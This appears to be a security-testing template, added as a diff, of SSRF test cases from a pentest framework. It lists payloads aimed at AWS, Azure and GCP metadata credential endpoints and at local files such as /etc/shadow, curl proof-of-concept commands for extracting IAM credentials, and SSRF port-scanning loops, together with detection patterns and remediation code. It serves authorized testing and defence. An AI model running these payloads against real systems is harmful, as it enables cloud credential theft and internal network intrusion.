@@ -1,0 +1,252 @@
+# OWASP A10:2021 - Server-Side Request Forgery (SSRF)
+# SSRF Test Cases
+
+test_case_category: "A10-ssrf"
+vulnerability_type: "Server-Side Request Forgery"
+cwe_id: "CWE-918"
+owasp_category: "A10:2021-Server-Side Request Forgery (SSRF)"
+
+test_cases:
+  - id: "SSRF-001"
+    name: "Cloud Metadata Exploitation - AWS"
+    description: "Test if application can be forced to access AWS metadata service"
+    severity: "CRITICAL"
+    cvss_score: 9.6
+    
+    test_steps:
+      - step: 1
+        action: "Identify URL parameter that fetches external resources"
+        examples:
+          - "GET /api/fetch?url=https://example.com"
+          - "POST /webhook?callback_url=https://webhook.site"
+      
+      - step: 2
+        action: "Attempt to access AWS metadata service"
+        request: "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/"
+        expected: "Request blocked or timeout (secure)"
+        vulnerability_indicator: "AWS metadata returned (VULNERABLE)"
+      
+      - step: 3
+        action: "Extract AWS credentials"
+        request: "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
+        vulnerability_indicator: "AWS AccessKeyId, SecretAccessKey exposed"
+    
+    validation_rules:
+      - rule: "Response contains cloud metadata"
+        aws_patterns:
+          - "ami-id"
+          - "instance-id"
+          - "AccessKeyId"
+          - "SecretAccessKey"
+        azure_patterns:
+          - "subscriptionId"
+          - "resourceGroupName"
+        gcp_patterns:
+          - "projectId"
+          - "access_token"
+      
+      - rule: "Internal IP address accessible"
+        patterns:
+          - "169.254.169.254"
+          - "127.0.0.1"
+          - "localhost"
+          - "192.168.*"
+          - "10.*"
+    
+    payloads:
+      aws_metadata:
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "http://169.254.169.254/latest/user-data/"
+        - "http://instance-data/latest/meta-data/"
+      
+      azure_metadata:
+        - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+        - "http://169.254.169.254/metadata/identity/oauth2/token"
+      
+      gcp_metadata:
+        - "http://metadata.google.internal/computeMetadata/v1/"
+        - "http://metadata/computeMetadata/v1/instance/service-accounts/default/token"
+      
+      localhost_variations:
+        - "http://127.0.0.1"
+        - "http://localhost"
+        - "http://0.0.0.0"
+        - "http://[::1]"
+        - "http://127.1"
+        - "http://2130706433"  # Decimal IP
+      
+      internal_services:
+        - "http://192.168.1.1"
+        - "http://10.0.0.1"
+        - "http://172.16.0.1"
+        - "http://internal.company.local"
+    
+    poc_template:
+      curl_commands:
+        - description: "Test SSRF via URL parameter"
+          command: |
+            curl -X GET "https://{{target_domain}}/api/fetch?url=http://169.254.169.254/latest/meta-data/" \
+              -H "User-Agent: Mozilla/5.0"
+        
+        - description: "Extract AWS IAM credentials"
+          command: |
+            curl -X GET "https://{{target_domain}}/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
+              -H "User-Agent: Mozilla/5.0"
+        
+        - description: "Access internal service"
+          command: |
+            curl -X GET "https://{{target_domain}}/api/fetch?url=http://192.168.1.1:8080/admin" \
+              -H "User-Agent: Mozilla/5.0"
+        
+        - description: "Port scanning via SSRF"
+          command: |
+            for port in 22 80 443 3306 6379 27017; do
+              echo "Scanning port $port..."
+              curl -X GET "https://{{target_domain}}/api/fetch?url=http://127.0.0.1:$port" \
+                -s -o /dev/null -w "Port $port: %{http_code}\n"
+            done
+      
+      screenshot_steps:
+        - "01_normal_url_fetch.png - GET /api/fetch?url=https://example.com works"
+        - "02_ssrf_metadata_access.png - URL points to 169.254.169.254"
+        - "03_aws_metadata_exposed.png - Response shows ami-id, instance-id"
+        - "04_iam_credentials_leaked.png - AccessKeyId and SecretAccessKey visible"
+        - "05_internal_service_accessed.png - 192.168.1.1 admin panel loaded"
+    
+    retest_conditions:
+      internal_resource_verification:
+        internal_targets:
+          - "http://127.0.0.1"
+          - "http://localhost"
+          - "http://192.168.1.1"
+          - "http://10.0.0.1"
+          - "http://169.254.169.254/latest/meta-data/"
+          - "http://internal.company.local"
+        success_criteria: "Response contains internal resource data"
+        minimum_successful_requests: 2
+      
+      protocol_variation:
+        protocols:
+          - "http://169.254.169.254/"
+          - "https://169.254.169.254/"
+          - "file:///etc/passwd"
+          - "ftp://internal.ftp.server/"
+          - "gopher://internal.service:70/"
+        success_criteria: "At least 2 different protocols fetch internal resources"
+    
+    remediation:
+      priority: "CRITICAL"
+      recommendations:
+        - "Validate and whitelist allowed domains/IPs"
+        - "Block access to private IP ranges (RFC 1918)"
+        - "Disable unnecessary protocols (file://, gopher://, ftp://)"
+        - "Use network segmentation to isolate application servers"
+        - "Implement IMDSv2 for AWS (requires session token)"
+        - "Monitor outbound traffic for suspicious internal requests"
+      
+      code_example: |
+        # Vulnerable code (Python)
+        import requests
+        url = request.args.get('url')
+        response = requests.get(url)  # VULNERABLE - No validation
+        
+        # Secure code (Python)
+        import requests
+        from urllib.parse import urlparse
+        
+        def is_safe_url(url):
+            parsed = urlparse(url)
+            # Whitelist allowed domains
+            allowed_domains = ['example.com', 'api.partner.com']
+            if parsed.hostname not in allowed_domains:
+                return False
+            
+            # Block private IP ranges
+            private_ips = ['127.', '10.', '172.16.', '192.168.', '169.254.']
+            if any(parsed.hostname.startswith(ip) for ip in private_ips):
+                return False
+            
+            # Only allow HTTP/HTTPS
+            if parsed.scheme not in ['http', 'https']:
+                return False
+            
+            return True
+        
+        url = request.args.get('url')
+        if is_safe_url(url):
+            response = requests.get(url, timeout=5)
+        else:
+            return "Invalid URL", 400
+
+  - id: "SSRF-002"
+    name: "Blind SSRF - Port Scanning"
+    description: "Test for blind SSRF using response time differences"
+    severity: "HIGH"
+    cvss_score: 7.5
+    
+    test_steps:
+      - step: 1
+        action: "Scan open ports via response time"
+        check: "Request http://127.0.0.1:80 (open) vs http://127.0.0.1:9999 (closed)"
+        expected: "No timing difference (secure)"
+        vulnerability_indicator: "Open ports respond faster than closed ports"
+    
+    poc_template:
+      curl_commands:
+        - description: "Blind SSRF port scan"
+          command: |
+            for port in {1..1000}; do
+              start=$(date +%s%N)
+              curl -X GET "https://{{target_domain}}/api/fetch?url=http://127.0.0.1:$port" \
+                -s -o /dev/null
+              end=$(date +%s%N)
+              elapsed=$((($end - $start) / 1000000))
+              echo "Port $port: ${elapsed}ms"
+            done
+
+  - id: "SSRF-003"
+    name: "SSRF via File Protocol - Local File Read"
+    description: "Test if file:// protocol can read local files"
+    severity: "CRITICAL"
+    cvss_score: 9.1
+    
+    test_steps:
+      - step: 1
+        action: "Attempt to read /etc/passwd via file protocol"
+        request: "GET /api/fetch?url=file:///etc/passwd"
+        expected: "Protocol blocked or error (secure)"
+        vulnerability_indicator: "File contents returned (VULNERABLE)"
+    
+    payloads:
+      file_protocol:
+        - "file:///etc/passwd"
+        - "file:///etc/shadow"
+        - "file:///var/log/apache2/access.log"
+        - "file:///proc/self/environ"
+        - "file://C:/Windows/System32/drivers/etc/hosts"
+
+confidence_scoring:
+  high_confidence_indicators:
+    - "Cloud metadata (AWS/Azure/GCP) successfully accessed"
+    - "IAM credentials or access tokens leaked"
+    - "Internal service banners retrieved"
+    - "Local file contents read via file://"
+    - "Reproducibility > 90%"
+  
+  medium_confidence_indicators:
+    - "Internal IP responds (but no sensitive data)"
+    - "Timing differences reveal port states"
+    - "Single protocol works (HTTP only, not HTTPS/file)"
+  
+  low_confidence_indicators:
+    - "All internal requests blocked"
+    - "WAF blocking SSRF attempts"
+    - "No clear evidence of internal access"
+
+references:
+  - "OWASP Testing Guide - Testing for SSRF (WSTG-INPV-19)"
+  - "OWASP Top 10 2021 - A10:2021 Server-Side Request Forgery"
+  - "CWE-918: Server-Side Request Forgery (SSRF)"
+  - "PortSwigger SSRF Academy"
+  - "AWS IMDSv2 Best Practices"
